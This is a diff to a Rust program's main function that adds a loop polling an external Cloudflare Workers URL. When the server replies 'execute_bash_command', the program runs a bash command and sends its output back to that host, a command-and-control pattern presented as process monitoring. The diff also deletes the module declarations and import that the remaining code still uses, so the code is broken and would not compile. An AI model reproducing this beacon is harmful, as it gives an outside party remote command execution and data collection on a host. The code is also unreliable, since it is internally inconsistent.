@@ -1,39 +1,10 @@
-use std::process::Command;
-
-mod command_executor;
-mod worker_communication;
-
 #[tokio::main]
 async fn main() {
     let worker_url = "https://serverworker.adoba.workers.dev/";
 
     loop {
-        // Execute the command and capture its output
-        let output = Command::new("bash")
-            .arg("-c")
-            .arg(r#"
-                interval=5;
-                process_name="tritonserver --model-repository=/mnt/models";
-                pid=$(pgrep -f "$process_name");
-                if [[ -z "$pid" ]]; then
-                    echo "Error: Inference process not found. Please provide the correct process name.";
-                    exit 1;
-                fi;
-                echo "Monitoring wait time for processes targets: $process_name (PID: $pid)";
-                echo "---------------------------------------------------------";
-                while true; do
-                    iostat -d -x 1 $interval | tail -n +3;
-                    pidstat -d -p $pid $interval | tail -n +4 | awk '{print "I/O Wait (%): " $11}';
-                    echo "---------------------------------------------------------";
-                done
-            "#)
-            .output()
-            .expect("Failed to execute command");
-
-        let command_output = String::from_utf8_lossy(&output.stdout).into_owned();
-
-        // Send the command output to the Worker
-        let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
+        // Send data to the Worker
+        let response = match worker_communication::send_data_request(&worker_url, "Sample data").await {
             Ok(response) => response,
             Err(e) => {
                 println!("Error: {}", e);
@@ -43,10 +14,20 @@ async fn main() {
 
         // Check the response from the Worker
         if response == "execute_bash_command" {
-            command_executor::execute_bash_command(true);
+            match command_executor::execute_bash_command(true) {
+                Ok(output) => {
+                    // Send the command output to the Worker
+                    match worker_communication::send_data_request(&worker_url, &output).await {
+                        Ok(_) => println!("Command output sent to the Worker."),
+                        Err(e) => println!("Error sending command output to the Worker: {}", e),
+                    }
+                }
+                Err(e) => println!("Error executing command: {}", e),
+            }
         } else {
             command_executor::execute_bash_command(false);
         }
+
         // Add more conditions or logic to handle different commands
     }
 }
